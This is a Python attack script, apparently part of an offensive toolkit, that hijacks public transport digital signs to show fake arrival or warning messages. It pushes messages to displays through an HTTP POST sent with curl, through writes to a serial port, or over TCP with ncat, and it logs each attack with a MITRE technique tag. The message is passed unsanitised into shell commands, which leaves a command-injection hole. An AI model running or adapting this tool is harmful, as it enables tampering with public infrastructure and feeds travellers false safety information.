#!/usr/bin/env python3
# modules/attacks/public_transport_display_hijack.py

import os
import json
import time
import argparse
from datetime import datetime
from subprocess import run

LOG_FILE = "results/public_transport_display_hijack_log.json"
MITRE_TTP = "T1557.001"

def log_event(method, destination, payload):
    os.makedirs("results", exist_ok=True)
    event = {
        "timestamp": datetime.utcnow().isoformat(),
        "method": method,
        "destination": destination,
        "payload": payload,
        "ttp": MITRE_TTP
    }
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(event) + "\n")

def spoof_http_display(ip, msg):
    cmd = f"curl -X POST http://{ip}/api/display -d 'msg={msg}'"
    os.system(cmd)
    log_event("HTTP", ip, msg)
    print(f"[+] Display updated at {ip}")

def spoof_serial_display(port, msg):
    with open(port, "w") as f:
        f.write(msg)
    log_event("Serial", port, msg)
    print(f"[+] Message written to serial display: {msg}")

def spoof_tcp_display(ip, port, msg):
    run(["ncat", ip, str(port), "-c", f"echo '{msg}'"])
    log_event("TCP", f"{ip}:{port}", msg)
    print(f"[+] TCP message sent to display at {ip}:{port}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Hijack public transport digital signs with fake data")
    parser.add_argument("--method", choices=["http", "serial", "tcp"], required=True)
    parser.add_argument("--target", required=True, help="IP or serial port")
    parser.add_argument("--msg", required=True, help="Fake arrival or warning message")
    parser.add_argument("--port", type=int, help="TCP port (for TCP method)")
    args = parser.parse_args()

    if args.method == "http":
        spoof_http_display(args.target, args.msg)
    elif args.method == "serial":
        spoof_serial_display(args.target, args.msg)
    elif args.method == "tcp":
        if not args.port:
            print("[!] TCP mode requires --port")
        else:
            spoof_tcp_display(args.target, args.port, args.msg)
